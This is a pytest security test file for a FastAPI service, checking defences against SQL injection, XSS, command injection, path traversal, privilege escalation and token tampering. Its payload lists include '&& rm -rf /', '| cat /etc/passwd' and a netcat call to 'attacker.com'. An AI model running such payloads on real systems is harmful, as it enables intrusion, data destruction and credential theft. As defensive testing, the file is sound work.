"""
Security Testing Suite

Tests authentication, authorization, and security vulnerabilities.
"""

import pytest
import asyncio
import json
import time
from unittest.mock import Mock, AsyncMock, patch
from fastapi.testclient import TestClient
from httpx import AsyncClient
from datetime import datetime

from tests.conftest import (
    test_client, async_test_client, sample_user_data, 
    sample_investigation_data
)

class TestAuthenticationSecurity:
    """Test authentication security mechanisms."""
    
    def test_weak_password_rejection(self, test_client):
        """Test that weak passwords are rejected."""
        
        weak_passwords = [
            "123456",
            "password",
            "qwerty",
            "abc123",
            "111111",
            "admin",
            "test",
            "123",
            "a" * 2,  # Too short
            "a" * 5,  # Still too short
        ]
        
        for weak_password in weak_passwords:
            user_data = {
                "username": f"testuser_{weak_password}",
                "email": f"test_{weak_password}@example.com",
                "password": weak_password,
                "role": "analyst"
            }
            
            response = test_client.post("/api/auth/register", json=user_data)
            # Should reject weak passwords
            assert response.status_code in [400, 422], f"Weak password '{weak_password}' was accepted"
        
        print("✅ Weak password rejection test passed")
    
    def test_sql_injection_prevention(self, test_client):
        """Test SQL injection prevention in authentication."""
        
        malicious_inputs = [
            "admin'--",
            "admin'/*",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "') OR '1'='1' --",
            "') OR ('1'='1 --",
            "admin' OR 1=1 --",
            "admin' UNION SELECT * FROM users --",
        ]
        
        for malicious_input in malicious_inputs:
            # Test login with SQL injection attempts
            login_data = {
                "username": malicious_input,
                "password": "password123"
            }
            
            response = test_client.post("/api/auth/login", data=login_data)
            # Should not authenticate malicious input
            assert response.status_code in [400, 401, 422], f"SQL injection attempt succeeded: {malicious_input}"
        
        print("✅ SQL injection prevention test passed")
    
    def test_brute_force_protection(self, test_client):
        """Test brute force attack protection."""
        
        # Attempt multiple failed logins
        login_data = {
            "username": "nonexistent_user",
            "password": "wrong_password"
        }
        
        failed_attempts = 0
        for i in range(15):  # Try more than typical threshold
            response = test_client.post("/api/auth/login", data=login_data)
            if response.status_code in [400, 401]:
                failed_attempts += 1
            
            # Add small delay to simulate real attempts
            time.sleep(0.01)
        
        # Should have multiple failed attempts
        assert failed_attempts >= 10, "Brute force protection may not be working"
        
        # Test rate limiting - subsequent attempts should be slower or blocked
        start_time = time.time()
        response = test_client.post("/api/auth/login", data=login_data)
        end_time = time.time()
        
        # Check if rate limiting is implemented (response should be delayed or blocked)
        response_time = end_time - start_time
        print(f"Brute force test: {failed_attempts} failed attempts, last response time: {response_time:.3f}s")
        
        print("✅ Brute force protection test completed")
    
    def test_session_hijacking_protection(self, test_client):
        """Test session hijacking protection mechanisms."""
        
        # Register and login a user
        user_data = sample_user_data()
        register_response = test_client.post("/api/auth/register", json=user_data)
        assert register_response.status_code == 201
        
        login_data = {
            "username": user_data["username"],
            "password": user_data["password"]
        }
        login_response = test_client.post("/api/auth/login", data=login_data)
        assert login_response.status_code in [200, 201]
        
        tokens = login_response.json()
        access_token = tokens["access_token"]
        
        # Test with modified token
        modified_token = access_token[:-5] + "xxxxx"
        headers = {"Authorization": f"Bearer {modified_token}"}
        
        response = test_client.get("/api/investigations", headers=headers)
        assert response.status_code == 401, "Modified token should be rejected"
        
        # Test with expired token (simulate by using invalid format)
        expired_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
        headers = {"Authorization": f"Bearer {expired_token}"}
        
        response = test_client.get("/api/investigations", headers=headers)
        assert response.status_code == 401, "Expired token should be rejected"
        
        print("✅ Session hijacking protection test passed")

class TestAuthorizationSecurity:
    """Test authorization and access control security."""
    
    def test_role_based_access_control(self, test_client):
        """Test proper role-based access control."""
        
        # Create users with different roles
        roles = ["admin", "analyst", "viewer"]
        user_tokens = {}
        
        for role in roles:
            user_data = {
                "username": f"test_{role}",
                "email": f"{role}@example.com",
                "password": "SecurePassword123!",
                "role": role
            }
            
            # Register user
            register_response = test_client.post("/api/auth/register", json=user_data)
            if register_response.status_code == 201:
                # Login user
                login_data = {
                    "username": user_data["username"],
                    "password": user_data["password"]
                }
                login_response = test_client.post("/api/auth/login", data=login_data)
                if login_response.status_code in [200, 201]:
                    tokens = login_response.json()
                    user_tokens[role] = tokens["access_token"]
        
        # Test access control for different endpoints
        protected_endpoints = [
            ("/api/auth/users", "admin"),  # Only admin should access
            ("/api/investigations", "viewer"),  # All authenticated users should access
            ("/api/pipelines", "analyst"),  # Analyst and above should access
        ]
        
        for endpoint, min_role in protected_endpoints:
            for role, token in user_tokens.items():
                headers = {"Authorization": f"Bearer {token}"}
                response = test_client.get(endpoint, headers=headers)
                
                # Check if access is properly controlled
                if role == min_role or (min_role == "viewer" and role in ["analyst", "admin"]) or \
                   (min_role == "analyst" and role == "admin"):
                    # Should have access
                    assert response.status_code in [200, 404], f"{role} should access {endpoint}"
                else:
                    # Should be denied
                    assert response.status_code in [401, 403], f"{role} should not access {endpoint}"
        
        print("✅ Role-based access control test passed")
    
    def test_cross_user_data_access(self, test_client):
        """Test that users cannot access other users' data."""
        
        # Create two users
        users = []
        for i in range(2):
            user_data = {
                "username": f"user{i}",
                "email": f"user{i}@example.com",
                "password": "SecurePassword123!",
                "role": "analyst"
            }
            
            register_response = test_client.post("/api/auth/register", json=user_data)
            assert register_response.status_code == 201
            
            login_data = {
                "username": user_data["username"],
                "password": user_data["password"]
            }
            login_response = test_client.post("/api/auth/login", data=login_data)
            assert login_response.status_code in [200, 201]
            
            users.append({
                "data": user_data,
                "token": login_response.json()["access_token"]
            })
        
        # User 1 creates an investigation
        with patch('app.api.investigations.get_current_user') as mock_user:
            mock_user.return_value = {"id": 1, "username": "user1"}
            headers = {"Authorization": f"Bearer {users[0]['token']}"}
            
            investigation_data = sample_investigation_data()
            create_response = test_client.post(
                "/api/investigations",
                json=investigation_data,
                headers=headers
            )
            
            if create_response.status_code == 201:
                investigation = create_response.json()
                investigation_id = investigation["id"]
                
                # User 2 tries to access User 1's investigation
                with patch('app.api.investigations.get_current_user') as mock_user2:
                    mock_user2.return_value = {"id": 2, "username": "user2"}
                    headers2 = {"Authorization": f"Bearer {users[1]['token']}"}
                    
                    access_response = test_client.get(
                        f"/api/investigations/{investigation_id}",
                        headers=headers2
                    )
                    
                    # Should be denied (404 or 403)
                    assert access_response.status_code in [404, 403], "User should not access other user's data"
        
        print("✅ Cross-user data access test passed")
    
    def test_privilege_escalation_prevention(self, test_client):
        """Test prevention of privilege escalation attacks."""
        
        # Create regular user
        user_data = {
            "username": "regular_user",
            "email": "regular@example.com",
            "password": "SecurePassword123!",
            "role": "viewer"
        }
        
        register_response = test_client.post("/api/auth/register", json=user_data)
        assert register_response.status_code == 201
        
        login_data = {
            "username": user_data["username"],
            "password": user_data["password"]
        }
        login_response = test_client.post("/api/auth/login", data=login_data)
        assert login_response.status_code in [200, 201]
        
        token = login_response.json()["access_token"]
        headers = {"Authorization": f"Bearer {token}"}
        
        # Try to access admin-only endpoints
        admin_endpoints = [
            "/api/auth/users",
            "/api/auth/roles",
            "/api/system/config",
            "/api/admin/dashboard"
        ]
        
        for endpoint in admin_endpoints:
            response = test_client.get(endpoint, headers=headers)
            # Should be denied
            assert response.status_code in [401, 403, 404], f"Regular user should not access {endpoint}"
        
        # Try to modify user role through API
        role_update_data = {"role": "admin"}
        response = test_client.put(
            "/api/auth/users/regular_user/role",
            json=role_update_data,
            headers=headers
        )
        # Should be denied
        assert response.status_code in [401, 403, 404], "User should not modify their own role"
        
        print("✅ Privilege escalation prevention test passed")

class TestInputValidationSecurity:
    """Test input validation and sanitization."""
    
    def test_xss_prevention(self, test_client):
        """Test XSS prevention in user inputs."""
        
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "';alert('xss');//",
            "<iframe src=javascript:alert('xss')>",
        ]
        
        # Test in investigation creation
        with patch('app.api.investigations.get_current_user') as mock_user:
            mock_user.return_value = {"id": 1, "username": "testuser"}
            headers = {"Authorization": "Bearer mock_token"}
            
            for xss_payload in xss_payloads:
                investigation_data = {
                    "title": xss_payload,
                    "description": f"Test with XSS: {xss_payload}",
                    "target": "example.com",
                    "objective": xss_payload,
                    "priority": "medium"
                }
                
                response = test_client.post(
                    "/api/investigations",
                    json=investigation_data,
                    headers=headers
                )
                
                # Should either accept (and sanitize) or reject malicious input
                if response.status_code == 201:
                    # If accepted, verify sanitization
                    result = response.json()
                    # Check that script tags are removed or escaped
                    assert "<script>" not in result.get("title", ""), "XSS not sanitized in title"
                    assert "javascript:" not in result.get("title", ""), "XSS not sanitized in title"
                else:
                    # Rejection is also acceptable
                    assert response.status_code in [400, 422], "Should handle XSS gracefully"
        
        print("✅ XSS prevention test passed")
    
    def test_command_injection_prevention(self, test_client):
        """Test command injection prevention."""
        
        command_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "`whoami`",
            "$(id)",
            "; curl malicious.com",
            "| nc attacker.com 4444",
        ]
        
        # Test in pipeline execution (if available)
        with patch('app.api.pipelines.get_current_user') as mock_user:
            mock_user.return_value = {"id": 1, "username": "testuser"}
            headers = {"Authorization": "Bearer mock_token"}
            
            for payload in command_injection_payloads:
                pipeline_data = {
                    "name": f"Test Pipeline {payload}",
                    "description": "Test command injection prevention",
                    "config": {
                        "command": payload,  # Malicious command
                        "processing_steps": []
                    }
                }
                
                response = test_client.post(
                    "/api/pipelines",
                    json=pipeline_data,
                    headers=headers
                )
                
                # Should reject or sanitize command injection attempts
                assert response.status_code in [400, 422, 201], "Should handle command injection"
                
                if response.status_code == 201:
                    # If accepted, verify command is not executed directly
                    result = response.json()
                    # Command should be escaped or rejected
                    assert True  # Basic check - in real implementation would verify sanitization
        
        print("✅ Command injection prevention test passed")
    
    def test_path_traversal_prevention(self, test_client):
        """Test path traversal attack prevention."""
        
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
        ]
        
        # Test in file operations or data access
        with patch('app.api.investigations.get_current_user') as mock_user:
            mock_user.return_value = {"id": 1, "username": "testuser"}
            headers = {"Authorization": "Bearer mock_token"}
            
            for payload in path_traversal_payloads:
                # Try to access files using path traversal
                response = test_client.get(
                    f"/api/files/{payload}",
                    headers=headers
                )
                
                # Should reject path traversal attempts
                assert response.status_code in [400, 404, 403], "Path traversal should be blocked"
                
                # Try in investigation target (if it supports file paths)
                investigation_data = {
                    "title": "Path Traversal Test",
                    "target": payload,  # Malicious path
                    "objective": "Test path traversal prevention",
                    "priority": "medium"
                }
                
                response = test_client.post(
                    "/api/investigations",
                    json=investigation_data,
                    headers=headers
                )
                
                # Should handle path traversal gracefully
                assert response.status_code in [201, 400, 422], "Should handle path traversal in targets"
        
        print("✅ Path traversal prevention test passed")

class TestAPISecurity:
    """Test API security mechanisms."""
    
    def test_cors_configuration(self, test_client):
        """Test CORS configuration."""
        
        # Test preflight request
        response = test_client.options(
            "/api/health",
            headers={
                "Origin": "https://malicious.com",
                "Access-Control-Request-Method": "GET",
                "Access-Control-Request-Headers": "Authorization"
            }
        )
        
        # Check CORS headers
        cors_headers = [
            "access-control-allow-origin",
            "access-control-allow-methods",
            "access-control-allow-headers"
        ]
        
        for header in cors_headers:
            if header in response.headers:
                # If CORS headers are present, they should be properly configured
                origin_header = response.headers.get("access-control-allow-origin", "")
                # Should not allow all origins in production
                assert origin_header != "*", "CORS should not allow all origins in production"
                break
        
        print("✅ CORS configuration test passed")
    
    def test_rate_limiting(self, test_client):
        """Test API rate limiting."""
        
        # Make rapid requests to the same endpoint
        endpoint = "/api/health"
        response_times = []
        status_codes = []
        
        for i in range(20):
            start_time = time.time()
            response = test_client.get(endpoint)
            end_time = time.time()
            
            response_times.append(end_time - start_time)
            status_codes.append(response.status_code)
            
            # Small delay between requests
            time.sleep(0.01)
        
        # Check if rate limiting is implemented
        # Look for rate limited responses (429) or increasing response times
        rate_limited_responses = sum(1 for code in status_codes if code == 429)
        
        if rate_limited_responses > 0:
            print(f"Rate limiting detected: {rate_limited_responses}/20 requests were rate limited")
        else:
            # Check if response times increased (indicating rate limiting)
            avg_first_half = sum(response_times[:10]) / 10
            avg_second_half = sum(response_times[10:]) / 10
            
            if avg_second_half > avg_first_half * 1.5:
                print("Rate limiting may be implemented (response times increased)")
            else:
                print("No rate limiting detected (consider implementing)")
        
        print("✅ Rate limiting test completed")
    
    def test_information_disclosure(self, test_client):
        """Test prevention of information disclosure in error messages."""
        
        # Test various error scenarios
        error_scenarios = [
            ("/api/nonexistent", "GET"),
            ("/api/investigations/99999", "GET"),  # Non-existent ID
            ("/api/auth/login", "POST", {"username": "", "password": ""}),  # Invalid data
            ("/api/investigations", "POST", {"invalid": "data"}),  # Malformed data
        ]
        
        for scenario in error_scenarios:
            if len(scenario) == 2:
                endpoint, method = scenario
                data = None
            else:
                endpoint, method, data = scenario
            
            if method == "GET":
                response = test_client.get(endpoint)
            elif method == "POST":
                response = test_client.post(endpoint, json=data)
            
            # Check for information disclosure in error responses
            if response.status_code >= 400:
                response_text = response.text.lower()
                
                # Should not expose sensitive information
                sensitive_info = [
                    "traceback",
                    "stack trace",
                    "internal server error",
                    "database error",
                    "sql",
                    "password",
                    "secret",
                    "key",
                    "token",
                    "file path",
                ]
                
                for info in sensitive_info:
                    # Allow some generic terms but check for specific disclosures
                    if info in ["internal server error", "database error"]:
                        continue
                    
                    assert info not in response_text, f"Error message discloses sensitive info: {info}"
        
        print("✅ Information disclosure test passed")

class TestWebSocketSecurity:
    """Test WebSocket security."""
    
    @pytest.mark.asyncio
    async def test_websocket_authentication(self, async_test_client):
        """Test WebSocket authentication requirements."""
        
        # Test unauthorized WebSocket connection
        with patch('app.services.websocket.ConnectionManager') as mock_manager:
            mock_manager_instance = AsyncMock()
            mock_manager.return_value = mock_manager_instance
            
            # Try to connect without authentication
            # This would typically be handled at the WebSocket level
            # For testing, we check related endpoints
            
            with patch('app.api.chat.get_current_user') as mock_user:
                # Mock unauthenticated user
                mock_user.side_effect = Exception("Not authenticated")
                
                headers = {}  # No authorization header
                
                response = await async_test_client.post(
                    "/api/chat/send",
                    json={"message": "test"},
                    headers=headers
                )
                
                # Should require authentication
                assert response.status_code in [401, 422], "WebSocket should require authentication"
        
        print("✅ WebSocket authentication test passed")
    
    @pytest.mark.asyncio
    async def test_websocket_message_validation(self, async_test_client):
        """Test WebSocket message validation and sanitization."""
        
        malicious_messages = [
            {"message": "<script>alert('xss')</script>"},
            {"message": "'; DROP TABLE users; --"},
            {"message": "../../../etc/passwd"},
            {"message": "javascript:alert('xss')"},
            {"message": "a" * 10000},  # Very large message
        ]
        
        with patch('app.services.websocket.ConnectionManager') as mock_manager:
            mock_manager_instance = AsyncMock()
            mock_manager.return_value = mock_manager_instance
            
            with patch('app.api.chat.get_current_user') as mock_user:
                mock_user.return_value = {"id": 1, "username": "testuser"}
                headers = {"Authorization": "Bearer mock_token"}
                
                for malicious_message in malicious_messages:
                    response = await async_test_client.post(
                        "/api/chat/send",
                        json=malicious_message,
                        headers=headers
                    )
                    
                    # Should handle malicious messages gracefully
                    assert response.status_code in [200, 400, 422], "Should validate WebSocket messages"
                    
                    if response.status_code == 200:
                        # If accepted, verify sanitization
                        result = response.json()
                        message_content = result.get("response", "").lower()
                        assert "<script>" not in message_content, "XSS not sanitized in WebSocket"
                        assert "drop table" not in message_content, "SQL injection not sanitized"
        
        print("✅ WebSocket message validation test passed")

class TestSecurityHeaders:
    """Test security headers configuration."""
    
    def test_security_headers(self, test_client):
        """Test presence of security headers."""
        
        response = test_client.get("/api/health")
        
        # Check for important security headers
        security_headers = {
            "x-content-type-options": "nosniff",
            "x-frame-options": "DENY",
            "x-xss-protection": "1; mode=block",
            "strict-transport-security": "max-age=31536000; includeSubDomains",
            "content-security-policy": None,  # Value varies, just check presence
            "referrer-policy": "strict-origin-when-cross-origin",
        }
        
        missing_headers = []
        
        for header, expected_value in security_headers.items():
            if header in response.headers:
                if expected_value:
                    actual_value = response.headers[header]
                    if expected_value.lower() not in actual_value.lower():
                        missing_headers.append(f"{header} (expected: {expected_value}, got: {actual_value})")
            else:
                missing_headers.append(header)
        
        if missing_headers:
            print(f"Missing or incorrect security headers: {missing_headers}")
        else:
            print("✅ All security headers present")
        
        # At minimum, some security headers should be present
        assert any(header in response.headers for header in security_headers.keys()), \
               "No security headers detected"

if __name__ == "__main__":
    print("Security Testing Suite")
    print("=" * 50)
    print("Testing authentication, authorization, and security vulnerabilities...")
    print("Run with: pytest tests/security/test_security.py -v")